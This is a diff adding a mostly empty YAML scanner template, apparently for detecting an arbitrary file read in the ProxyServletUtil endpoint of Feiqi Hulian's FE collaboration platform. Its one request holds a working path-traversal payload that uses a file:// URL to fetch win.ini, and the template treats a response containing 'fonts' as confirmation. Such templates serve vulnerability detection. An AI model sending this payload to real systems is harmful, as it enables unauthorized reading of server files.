@@ -1,0 +1,17 @@
+id:
+
+info:
+  name: 飞企互联FE业务协作平台 ProxyServletUti 任意文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /ProxyServletUti%6c?url=file:///c:/windows/win.ini
+response1:
+  headers:
+  body: fonts
+  code: 200
+requests2:
+response2:
